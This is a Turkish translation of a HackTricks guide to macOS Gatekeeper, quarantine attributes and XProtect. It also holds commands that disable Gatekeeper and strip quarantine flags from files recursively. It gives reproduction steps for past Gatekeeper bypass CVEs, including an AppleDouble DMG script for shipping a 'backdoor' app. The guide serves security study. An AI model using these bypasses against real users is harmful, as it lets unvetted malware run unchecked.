# macOS Gatekeeper / Karantina / XProtect

<details>

<summary><strong>AWS hackleme becerilerini sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını görmek** ister misiniz? veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonunu keşfedin
* [**Resmi PEASS & HackTricks ürünlerine**](https://peass.creator-spring.com) sahip olun
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter**'da takip edin 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Hacking hilelerinizi** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **göndererek paylaşın**
*
* .

</details>

## Gatekeeper

**Gatekeeper**, Mac işletim sistemleri için geliştirilen bir güvenlik özelliğidir ve kullanıcıların sistemlerinde **yalnızca güvenilir yazılımları çalıştırmalarını** sağlamayı amaçlar. Kullanıcının indirdiği ve App Store dışındaki kaynaklardan (bir uygulama, bir eklenti veya bir kurulum paketi gibi) açmaya çalıştığı yazılımı **doğrulayarak** çalıştırmasını sağlar.

Gatekeeper'ın temel mekanizması, indirilen yazılımın **tanınmış bir geliştirici tarafından imzalanıp imzalanmadığını** kontrol etmesidir, bu da yazılımın otantikliğini sağlar. Ayrıca, yazılımın **Apple tarafından noterleme işleminden geçip geçmediğini** de belirler. Bu, yazılımın bilinen kötü amaçlı içeriklerden arındırıldığını ve noterlemeden sonra değiştirilmediğini doğrular.

Ek olarak, Gatekeeper, kullanıcı kontrolünü ve güvenliğini güçlendirir ve kullanıcıları indirilen yazılımın ilk kez açılmasını **onaylamaya zorlar**. Bu güvenlik önlemi, kullanıcıların zararlı olabilecek yürütülebilir kodu yanlışlıkla zararsız bir veri dosyası olarak yanlış anlamalarını önlemeye yardımcı olur.

### Uygulama İmzaları

Uygulama imzaları, Apple'ın güvenlik altyapısının önemli bir bileşenidir. Bunlar, yazılım yazarının (geliştiricinin) kimliğini **doğrulamak** ve kodun son imzalandığından beri değiştirilmediğinden emin olmak için kullanılır.

İşleyiş şu şekildedir:

1. **Uygulamanın İmzalanması:** Bir geliştirici uygulamasını dağıtmaya hazır olduğunda, uygulamayı **özel bir anahtar kullanarak imzalar**. Bu özel anahtar, geliştirici Apple Developer Programına kaydolduğunda Apple tarafından geliştiriciye verilen bir **sertifika ile ilişkilidir**. İmzalama işlemi, uygulamanın tüm parçalarının kriptografik bir özetini oluşturmayı ve bu özeti geliştiricinin özel anahtarıyla şifrelemeyi içerir.
2. **Uygulamanın Dağıtılması:** İmzalanan uygulama, geliştiricinin sertifikasını içeren ilgili genel anahtarıyla birlikte kullanıcılara dağıtılır.
3. **Uygulamanın Doğrulanması:** Bir kullanıcı uygulamayı indirip çalıştırmaya çalıştığında, Mac işletim sistemi, geliştiricinin sertifikasından genel anahtarı kullanarak özeti şifresini çözer. Ardından, uygulamanın mevcut durumuna dayanarak özeti yeniden hesaplar ve bu özeti çözülen özetiyle karşılaştırır. Eşleşiyorsa, bu, uygulamanın geliştirici tarafından imzalandığından beri **değiştirilmediği** anlamına gelir ve sistem uygulamanın çalışmasına izin verir.

Uygulama imzaları, Apple'ın Gatekeeper teknolojisinin önemli bir parçasıdır. Bir kullanıcı, **internetten indirilen bir uygulamayı açmaya çalıştığında**, Gatekeeper uygulama imzasını doğrular. Eğer uygulama, Apple tarafından bilinen bir geliştiriciye verilen bir sertifika ile imzalanmışsa ve kod değiştirilmemişse, Gatekeeper uygulamanın çalışmasına izin verir. Aksi takdirde, uygulamayı engeller ve kullanıcıya uyarı verir.

macOS Catalina'dan itibaren, Gatekeeper ayrıca uygulamanın Apple tarafından **noterleme işleminden geçip geçmediğini** de kontrol eder ve ek bir güvenlik katmanı ekler. Noterleme işlemi, uygulamayı bilinen güvenlik sorunları ve kötü amaçlı kodlar açısından kontrol eder ve bu kontrolleri geçerse, Apple uygulamaya Gatekeeper'ın doğrulayabileceği bir biletleme ekler.

#### İmzaları Kontrol Etme

Bazı **kötü amaçlı yazılım örneğini** kontrol ederken her zaman **binary'nin imzasını kontrol etmelisiniz**, çünkü imzayı atan **geliştirici** zaten **kötü amaçlı yazılımla ilişkili** olabilir.
```bash
# Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

# Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

# Get entitlements from the binary
codesign -d --entitlements :- /System/Applications/Automator.app # Check the TCC perms

# Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app

# Sign a binary
codesign -s <cert-name-keychain> toolsdemo
```
### Notarizasyon

Apple'ın notarizasyon süreci, kullanıcıları potansiyel olarak zararlı yazılımlardan korumak için ek bir güvenlik önlemi olarak hizmet verir. Bu süreç, geliştiricinin uygulamasını Apple'ın Notary Service'ine göndermesini içerir, bu da App Review ile karıştırılmamalıdır. Bu hizmet, gönderilen yazılımı kötü amaçlı içerik ve kod imzalama ile ilgili potansiyel sorunlar açısından inceleyen otomatik bir sistemdir.

Yazılım, herhangi bir endişe uyandırmadan bu incelemeyi geçerse, Notary Service bir notarizasyon bileti oluşturur. Geliştirici daha sonra bu bileti yazılımlarına eklemek zorundadır, bu işleme 'stapling' denir. Ayrıca, notarizasyon bileti aynı zamanda Gatekeeper'ın erişebileceği şekilde çevrimiçi olarak da yayınlanır.

Kullanıcının yazılımı ilk kez yüklemesi veya çalıştırması durumunda, yürütülebilir dosyaya eklenmiş veya çevrimiçi bulunan notarizasyon bileti, Gatekeeper'a yazılımın Apple tarafından notarize edildiğini bildirir. Sonuç olarak, Gatekeeper, kullanıcıya yazılımın Apple tarafından kötü amaçlı içerik kontrolünden geçtiğini belirten açıklayıcı bir mesaj gösterir. Bu süreç, kullanıcıların sistemlerine yükledikleri veya çalıştırdıkları yazılımların güvenliği konusunda kullanıcı güvenini artırır.

### GateKeeper'ı Sıralama

GateKeeper, güvenilmeyen uygulamaların çalıştırılmasını önleyen birkaç güvenlik bileşeninden oluşan bir bileşendir.

GateKeeper'ın durumunu aşağıdaki komutla görebilirsiniz:
```bash
# Check the status
spctl --status
```
{% hint style="danger" %}
GateKeeper imza kontrolü, her dosyaya değil, yalnızca **Karantina özniteliği olan dosyalara** uygulanır.
{% endhint %}

GateKeeper, bir ikili dosyanın yürütülebilir olup olmadığını, **tercihler ve imza**ya göre kontrol eder:

<figure><img src="../../../.gitbook/assets/image (678).png" alt=""><figcaption></figcaption></figure>

Bu yapılandırmayı tutan veritabanı, **`/var/db/SystemPolicy`** konumundadır. Bu veritabanını kök olarak kontrol edebilirsiniz:
```bash
# Open database
sqlite3 /var/db/SystemPolicy

# Get allowed rules
SELECT requirement,allow,disabled,label from authority where label != 'GKE' and disabled=0;
requirement|allow|disabled|label
anchor apple generic and certificate 1[subject.CN] = "Apple Software Update Certification Authority"|1|0|Apple Installer
anchor apple|1|0|Apple System
anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] exists|1|0|Mac App Store
anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] exists and (certificate leaf[field.1.2.840.113635.100.6.1.14] or certificate leaf[field.1.2.840.113635.100.6.1.13]) and notarized|1|0|Notarized Developer ID
[...]
```
Dikkat edin, ilk kural "**App Store**" ile bitti ve ikinci kural "**Developer ID**" ile bitti ve önceki görüntüde **App Store'dan ve tanımlanmış geliştiricilerden uygulamaları çalıştırmaya izin verildi**.\
Eğer bu ayarı App Store olarak **değiştirirseniz, "Notarized Developer ID" kuralları kaybolacaktır**.

Ayrıca binlerce **GKE** türünde kural bulunmaktadır:
```bash
SELECT requirement,allow,disabled,label from authority where label = 'GKE' limit 5;
cdhash H"b40281d347dc574ae0850682f0fd1173aa2d0a39"|1|0|GKE
cdhash H"5fd63f5342ac0c7c0774ebcbecaf8787367c480f"|1|0|GKE
cdhash H"4317047eefac8125ce4d44cab0eb7b1dff29d19a"|1|0|GKE
cdhash H"0a71962e7a32f0c2b41ddb1fb8403f3420e1d861"|1|0|GKE
cdhash H"8d0d90ff23c3071211646c4c9c607cdb601cb18f"|1|0|GKE
```
Bu, **`/var/db/SystemPolicyConfiguration/gke.bundle/Contents/Resources/gke.auth`, `/var/db/gke.bundle/Contents/Resources/gk.db`** ve **`/var/db/gkopaque.bundle/Contents/Resources/gkopaque.db`** dosyalarından gelen karma değerleridir.

Önceki bilgileri şu şekilde listeleyebilirsiniz:
```bash
sudo spctl --list
```
**`spctl`** komutunun **`--master-disable`** ve **`--global-disable`** seçenekleri, bu imza kontrolünü tamamen **devre dışı** bırakır:
```bash
# Disable GateKeeper
spctl --global-disable
spctl --master-disable

# Enable it
spctl --global-enable
spctl --master-enable
```
Tamamen etkinleştirildiğinde, yeni bir seçenek görünecektir:

<figure><img src="../../../.gitbook/assets/image (679).png" alt=""><figcaption></figcaption></figure>

GateKeeper ile bir Uygulamanın **izin verilip verilmeyeceğini kontrol etmek** mümkündür:
```bash
spctl --assess -v /Applications/App.app
```
GateKeeper'a yeni kurallar eklemek mümkündür. Böylece belirli uygulamaların çalışmasına izin verilebilir:
```bash
# Check if allowed - nop
spctl --assess -v /Applications/App.app
/Applications/App.app: rejected
source=no usable signature

# Add a label and allow this label in GateKeeper
sudo spctl --add --label "whitelist" /Applications/App.app
sudo spctl --enable --label "whitelist"

# Check again - yep
spctl --assess -v /Applications/App.app
/Applications/App.app: accepted
```
### Karantina Dosyaları

Bir uygulama veya dosya indirildiğinde, web tarayıcıları veya e-posta istemcileri gibi belirli macOS uygulamaları indirilen dosyaya yaygın olarak bilinen "**karantina bayrağı**" olarak adlandırılan bir genişletilmiş dosya özniteliği ekler. Bu öznitelik, dosyanın güvenilmeyen bir kaynaktan (internet) geldiğini ve potansiyel riskler taşıdığını belirtmek için bir güvenlik önlemi olarak hareket eder. Bununla birlikte, tüm uygulamalar bu özniteliği eklememektedir, örneğin, yaygın BitTorrent istemci yazılımları genellikle bu süreci atlar.

**Karantina bayrağının bulunması, bir kullanıcının dosyayı çalıştırmaya çalıştığında macOS'un Gatekeeper güvenlik özelliğine sinyal verir**.

Karantina bayrağı **mevcut olmadığında** (bazı BitTorrent istemcileri aracılığıyla indirilen dosyalar gibi), Gatekeeper'ın **kontrolleri gerçekleştirilmeyebilir**. Bu nedenle, kullanıcılar daha az güvenli veya bilinmeyen kaynaklardan indirilen dosyaları açarken dikkatli olmalıdır.

{% hint style="info" %}
Kod imzalarının geçerliliğini kontrol etmek, kodun ve tüm paketlenmiş kaynaklarının kriptografik **hash'lerini oluşturmayı** içeren **kaynak yoğun** bir süreçtir. Ayrıca, sertifika geçerliliğini kontrol etmek, sertifikanın verildikten sonra iptal edilip edilmediğini görmek için Apple'ın sunucularına **çevrimiçi bir kontrol** yapmayı gerektirir. Bu nedenlerle, tam bir kod imzası ve onaylama kontrolü, bir uygulama başlatıldığında her seferinde çalıştırılması **uygulanabilir değildir**.

Bu nedenle, bu kontroller **yalnızca karantina özniteliğine sahip uygulamalar çalıştırıldığında çalıştırılır**.
{% endhint %}

{% hint style="warning" %}
Bu öznitelik, dosyayı oluşturan/indiren uygulama tarafından **ayarlanmalıdır**.

Ancak, kumlanmış dosyalar, oluşturdukları her dosya için bu özniteliğin ayarlanmış olması gerekmektedir. Ve kumlanmamış uygulamalar kendileri ayarlayabilir veya **Info.plist** içinde [**LSFileQuarantineEnabled**](https://developer.apple.com/documentation/bundleresources/information\_property\_list/lsfilequarantineenabled?language=objc) anahtarını belirtebilir, bu da sistemin oluşturulan dosyalara `com.apple.quarantine` genişletilmiş özniteliğini eklemesini sağlar.
{% endhint %}

Durumunu **kontrol etmek ve etkinleştirmek/devre dışı bırakmak** (kök erişimi gereklidir) mümkündür:
```bash
spctl --status
assessments enabled

spctl --enable
spctl --disable
#You can also allow nee identifies to execute code using the binary "spctl"
```
Ayrıca, bir dosyanın karantina genişletilmiş özniteliğe sahip olup olmadığını şu şekilde bulabilirsiniz:
```bash
xattr file.png
com.apple.macl
com.apple.quarantine
```
**Değerin** **uzatılmış** **özniteliklerini** kontrol edin ve karantina özniteliğini yazan uygulamayı bulmak için şunu yapın:
```bash
xattr -l portada.png
com.apple.macl:
00000000  03 00 53 DA 55 1B AE 4C 4E 88 9D CA B7 5C 50 F3  |..S.U..LN.....P.|
00000010  16 94 03 00 27 63 64 97 98 FB 4F 02 84 F3 D0 DB  |....'cd...O.....|
00000020  89 53 C3 FC 03 00 27 63 64 97 98 FB 4F 02 84 F3  |.S....'cd...O...|
00000030  D0 DB 89 53 C3 FC 00 00 00 00 00 00 00 00 00 00  |...S............|
00000040  00 00 00 00 00 00 00 00                          |........|
00000048
com.apple.quarantine: 00C1;607842eb;Brave;F643CD5F-6071-46AB-83AB-390BA944DEC5
# 00c1 -- It has been allowed to eexcute this file (QTN_FLAG_USER_APPROVED = 0x0040)
# 607842eb -- Timestamp
# Brave -- App
# F643CD5F-6071-46AB-83AB-390BA944DEC5 -- UID assigned to the file downloaded
```
Aslında bir işlem, oluşturduğu dosyalara karantina bayrakları ayarlayabilir (USER_APPROVED bayrağını oluşturulan bir dosyaya uygulamayı denedim ancak uygulanmadı):

<details>

<summary>Karantina bayrakları uygulama kaynak kodu</summary>
```c
#include <stdio.h>
#include <stdlib.h>

enum qtn_flags {
QTN_FLAG_DOWNLOAD = 0x0001,
QTN_FLAG_SANDBOX = 0x0002,
QTN_FLAG_HARD = 0x0004,
QTN_FLAG_USER_APPROVED = 0x0040,
};

#define qtn_proc_alloc _qtn_proc_alloc
#define qtn_proc_apply_to_self _qtn_proc_apply_to_self
#define qtn_proc_free _qtn_proc_free
#define qtn_proc_init _qtn_proc_init
#define qtn_proc_init_with_self _qtn_proc_init_with_self
#define qtn_proc_set_flags _qtn_proc_set_flags
#define qtn_file_alloc _qtn_file_alloc
#define qtn_file_init_with_path _qtn_file_init_with_path
#define qtn_file_free _qtn_file_free
#define qtn_file_apply_to_path _qtn_file_apply_to_path
#define qtn_file_set_flags _qtn_file_set_flags
#define qtn_file_get_flags _qtn_file_get_flags
#define qtn_proc_set_identifier _qtn_proc_set_identifier

typedef struct _qtn_proc *qtn_proc_t;
typedef struct _qtn_file *qtn_file_t;

int qtn_proc_apply_to_self(qtn_proc_t);
void qtn_proc_init(qtn_proc_t);
int qtn_proc_init_with_self(qtn_proc_t);
int qtn_proc_set_flags(qtn_proc_t, uint32_t flags);
qtn_proc_t qtn_proc_alloc();
void qtn_proc_free(qtn_proc_t);
qtn_file_t qtn_file_alloc(void);
void qtn_file_free(qtn_file_t qf);
int qtn_file_set_flags(qtn_file_t qf, uint32_t flags);
uint32_t qtn_file_get_flags(qtn_file_t qf);
int qtn_file_apply_to_path(qtn_file_t qf, const char *path);
int qtn_file_init_with_path(qtn_file_t qf, const char *path);
int qtn_proc_set_identifier(qtn_proc_t qp, const char* bundleid);

int main() {

qtn_proc_t qp = qtn_proc_alloc();
qtn_proc_set_identifier(qp, "xyz.hacktricks.qa");
qtn_proc_set_flags(qp, QTN_FLAG_DOWNLOAD | QTN_FLAG_USER_APPROVED);
qtn_proc_apply_to_self(qp);
qtn_proc_free(qp);

FILE *fp;
fp = fopen("thisisquarantined.txt", "w+");
fprintf(fp, "Hello Quarantine\n");
fclose(fp);

return 0;

}
```
</details>

Ve **kaldır** bu özniteliği:
```bash
xattr -d com.apple.quarantine portada.png
#You can also remove this attribute from every file with
find . -iname '*' -print0 | xargs -0 xattr -d com.apple.quarantine
```
Ve karantinaya alınmış tüm dosyaları bulmak için şunu kullanın:

{% code overflow="wrap" %}
```bash
find / -exec ls -ld {} \; 2>/dev/null | grep -E "[x\-]@ " | awk '{printf $9; printf "\n"}' | xargs -I {} xattr -lv {} | grep "com.apple.quarantine"
```
{% endcode %}

Karantina bilgileri, **`~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2`** tarafından yönetilen merkezi bir veritabanında saklanır.

#### **Quarantine.kext**

Çekirdek uzantısı sadece sistemdeki **çekirdek önbelleği** aracılığıyla kullanılabilir; ancak, **https://developer.apple.com/** adresinden Kernel Hata Ayıklama Kiti'ni indirebilirsiniz, bu kit, uzantının sembolize edilmiş bir sürümünü içerecektir.

### XProtect

XProtect, macOS'ta yerleşik bir **anti-malware** özelliğidir. XProtect, herhangi bir uygulama ilk kez başlatıldığında veya değiştirildiğinde, bilinen kötü amaçlı yazılım ve güvensiz dosya türleri veritabanına karşı kontrol eder. Safari, Mail veya Messages gibi belirli uygulamalar aracılığıyla bir dosya indirdiğinizde, XProtect otomatik olarak dosyayı tarar. Veritabanındaki herhangi bir bilinen kötü amaçlı yazılıma uyan bir dosya indirildiğinde, XProtect dosyanın çalışmasını **engeller** ve tehdide ilişkin bir uyarı gösterir.

XProtect veritabanı, Apple tarafından düzenli olarak yeni kötü amaçlı yazılım tanımlarıyla güncellenir ve bu güncellemeler otomatik olarak Mac'inize indirilir ve yüklenir. Bu, XProtect'in her zaman en son bilinen tehditlerle güncel olduğunu sağlar.

Ancak, **XProtect tam özellikli bir antivirüs çözümü değildir**. Yalnızca belirli bir bilinen tehdit listesini kontrol eder ve çoğu antivirüs yazılımı gibi on-access tarama yapmaz.

En son XProtect güncellemesi hakkında bilgi almak için aşağıdaki komutu çalıştırabilirsiniz:

{% code overflow="wrap" %}
```bash
system_profiler SPInstallHistoryDataType 2>/dev/null | grep -A 4 "XProtectPlistConfigData" | tail -n 5
```
{% endcode %}

XProtect, **/Library/Apple/System/Library/CoreServices/XProtect.bundle** konumunda SIP korumalıdır ve içinde XProtect'ın kullandığı bilgilere ulaşabilirsiniz:

* **`XProtect.bundle/Contents/Resources/LegacyEntitlementAllowlist.plist`**: Bu cdhashlere sahip kodların eski yetkilendirmeleri kullanmasına izin verir.
* **`XProtect.bundle/Contents/Resources/XProtect.meta.plist`**: BundleID ve TeamID veya minimum bir sürüm belirterek yüklenmesine izin verilmeyen eklenti ve eklentilerin listesi.
* **`XProtect.bundle/Contents/Resources/XProtect.yara`**: Zararlı yazılımları tespit etmek için Yara kuralları.
* **`XProtect.bundle/Contents/Resources/gk.db`**: Engellenen uygulamaların ve TeamID'lerin karma değerlerini içeren SQLite3 veritabanı.

XProtect ile ilgisi olmayan başka bir Uygulama olan **`/Library/Apple/System/Library/CoreServices/XProtect.app`** olduğunu unutmayın.

### Gatekeeper Değil

{% hint style="danger" %}
Gatekeeper'ın her uygulamayı çalıştırdığını unutmayın, sadece _**AppleMobileFileIntegrity**_ (AMFI) zaten Gatekeeper tarafından doğrulanmış ve onaylanmış bir uygulamayı çalıştırdığınızda **yürütülebilir kod imzalarını doğrular**.
{% endhint %}

Bu nedenle, önceden bir uygulamayı Gatekeeper ile önbelleğe almak için uygulamayı çalıştırmanız ve onaylamanız mümkündü, ardından (Electron asar veya NIB dosyaları gibi) uygulamanın yürütülemez dosyalarını değiştirir ve başka bir koruma olmadığı sürece uygulama **zararlı** eklemelerle **çalıştırılırdı**.

Ancak, artık bu mümkün değil çünkü macOS, uygulama paketlerinin içindeki dosyaları değiştirmeyi **engeller**. Bu nedenle, [Dirty NIB](../macos-proces-abuse/macos-dirty-nib.md) saldırısını denerseniz, artık bunu kötüye kullanmanız mümkün olmadığını göreceksiniz çünkü uygulamayı Gatekeeper ile önbelleğe almak için uygulamayı çalıştırdıktan sonra paketi değiştiremezsiniz. Ve örneğin, İçerik dizininin adını NotCon olarak değiştirir ve ardından uygulamanın ana ikili dosyasını Gatekeeper ile önbelleğe almak için çalıştırırsanız, bir hata oluşur ve çalıştırılmaz.

## Gatekeeper Atlamaları

Gatekeeper'ı atlamak için herhangi bir yol (kullanıcının bir şeyi indirmesini ve Gatekeeper'ın izin vermemesi gereken bir şeyi çalıştırmasını sağlamak) macOS'ta bir güvenlik açığı olarak kabul edilir. Bunlar, geçmişte Gatekeeper'ı atlamayı sağlayan tekniklere atanan bazı CVE'lerdir:

### [CVE-2021-1810](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810)

**Arşiv Yardımcısı** kullanılarak çıkarma işlemi yapıldığında, **886 karakteri aşan yollara sahip** dosyalar com.apple.quarantine genişletilmiş özniteliğini almaz. Bu durum yanlışlıkla bu dosyaların Gatekeeper'ın güvenlik kontrollerini **atlamasına** izin verir.

Daha fazla bilgi için [**orijinal rapora**](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810) bakın.

### [CVE-2021-30990](https://ronmasas.com/posts/bypass-macos-gatekeeper)

Bir uygulama **Automator** ile oluşturulduğunda, neyi yürüteceği hakkındaki bilgiler `application.app/Contents/document.wflow` içindedir, yürütülebilirde değil. Yürütülebilir sadece genel bir Automator ikili dosyası olan **Automator Application Stub**'dır.

Bu nedenle, `application.app/Contents/MacOS/Automator\ Application\ Stub`'u **sembolik bir bağlantıyla sistemdeki başka bir Automator Application Stub'a** işaret edecek şekilde yaparsanız, `document.wflow` içindeki (betiğiniz) şeyi **Gatekeeper'ı tetiklemeden** yürütür çünkü gerçek yürütülebilirin karantina xattr'ı yoktur.&#x20;

Beklenen konum örneği: `/System/Library/CoreServices/Automator\ Application\ Stub.app/Contents/MacOS/Automator\ Application\ Stub`

Daha fazla bilgi için [**orijinal rapora**](https://ronmasas.com/posts/bypass-macos-gatekeeper) bakın.

### [CVE-2022-22616](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/)

Bu atlamada, bir zip dosyası `application.app` yerine `application.app/Contents`'den sıkıştırmaya başlayan bir uygulama oluşturuldu. Bu nedenle, **karantina özniteliği** tüm **`application.app/Contents`'daki dosyalara** uygulandı, ancak **`application.app`'a** uygulanmadı, Gatekeeper'ın kontrol ettiği şey bu olduğu için Gatekeeper atlandı, çünkü `application.app` tetiklendiğinde **karantina özniteliği yoktu**.
```bash
zip -r test.app/Contents test.zip
```
Daha fazla bilgi için [**orijinal rapora**](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/) bakın.

### [CVE-2022-32910](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32910)

Bileşenler farklı olsa da, bu güvenlik açığının sömürülmesi öncekine çok benzer. Bu durumda, **`application.app/Contents`** dizininden bir Apple Arşivi oluşturacağız, böylece **`application.app`** **Archive Utility** tarafından açıldığında karantina özelliği almayacak.
```bash
aa archive -d test.app/Contents -o test.app.aar
```
Daha fazla bilgi için [**orijinal rapora**](https://www.jamf.com/blog/jamf-threat-labs-macos-archive-utility-vulnerability/) bakın.

### [CVE-2022-42821](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)

ACL **`writeextattr`** özelliği, bir dosyada bir özniteliği yazmayı engellemek için kullanılabilir:
```bash
touch /tmp/no-attr
chmod +a "everyone deny writeextattr" /tmp/no-attr
xattr -w attrname vale /tmp/no-attr
xattr: [Errno 13] Permission denied: '/tmp/no-attr'
```
Ayrıca, **AppleDouble** dosya formatı, ACE'leri de içeren bir dosyanın kopyasını oluşturur.

[**Kaynak kodunda**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) görülebileceği gibi, **`com.apple.acl.text`** adlı xattr içinde depolanan ACL metin temsili, sıkıştırılmış dosyada ACL olarak ayarlanacaktır. Bu nedenle, ACL'yi diğer xattr'lerin yazılmasını engelleyen bir ACL ile bir uygulamayı zip dosyasına sıkıştırırsanız... karantina xattr'i uygulamaya ayarlanmaz:

{% code overflow="wrap" %}
```bash
chmod +a "everyone deny write,writeattr,writeextattr" /tmp/test
ditto -c -k test test.zip
python3 -m http.server
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr
```
{% endcode %}

Daha fazla bilgi için [**orijinal raporu**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) kontrol edin.

Unutmayın, bu ayrıca AppleArchives ile de sömürülebilir:
```bash
mkdir app
touch app/test
chmod +a "everyone deny write,writeattr,writeextattr" app/test
aa archive -d app -o test.aar
```
### [CVE-2023-27943](https://blog.f-secure.com/discovery-of-gatekeeper-bypass-cve-2023-27943/)

**Google Chrome'un indirilen dosyalara karantina özniteliği atamadığı** bazı macOS iç sorunları nedeniyle keşfedildi.

### [CVE-2023-27951](https://redcanary.com/blog/gatekeeper-bypass-vulnerabilities/)

AppleDouble dosya biçimleri, bir dosyanın özniteliklerini `._` ile başlayan ayrı bir dosyada saklar, bu macOS makineleri arasında dosya özniteliklerini kopyalamaya yardımcı olur. Ancak, bir AppleDouble dosyası sıkıştırıldıktan sonra, `._` ile başlayan dosyaya **karantina özniteliği atanmadığı** fark edildi.

{% code overflow="wrap" %}
```bash
mkdir test
echo a > test/a
echo b > test/b
echo ._a > test/._a
aa archive -d test/ -o test.aar

# If you downloaded the resulting test.aar and decompress it, the file test/._a won't have a quarantitne attribute
```
{% endcode %}

Quarantine özniteliği ayarlanmayan bir dosya oluşturabilmek, Gatekeeper'ı atlamak mümkündü. Hile, AppleDouble adlandırma kuralını kullanarak bir DMG dosyası uygulaması oluşturmak ve karantina özniteliği olmayan bu gizli dosyaya bir sembolik bağ olarak görünen bir dosya oluşturmaktı. DMG dosyası çalıştırıldığında, karantina özniteliği olmadığı için Gatekeeper'ı atlayacaktır.
```bash
# Create an app bundle with the backdoor an call it app.app

echo "[+] creating disk image with app"
hdiutil create -srcfolder app.app app.dmg

echo "[+] creating directory and files"
mkdir
mkdir -p s/app
cp app.dmg s/app/._app.dmg
ln -s ._app.dmg s/app/app.dmg

echo "[+] compressing files"
aa archive -d s/ -o app.aar
```
### Karantina xattr'ını Önle

Bir ".app" paketinde karantina xattr eklenmezse, **Gatekeeper tetiklenmeyecektir**.

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramanla öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github depolarına **PR göndererek paylaşın**.

</details>
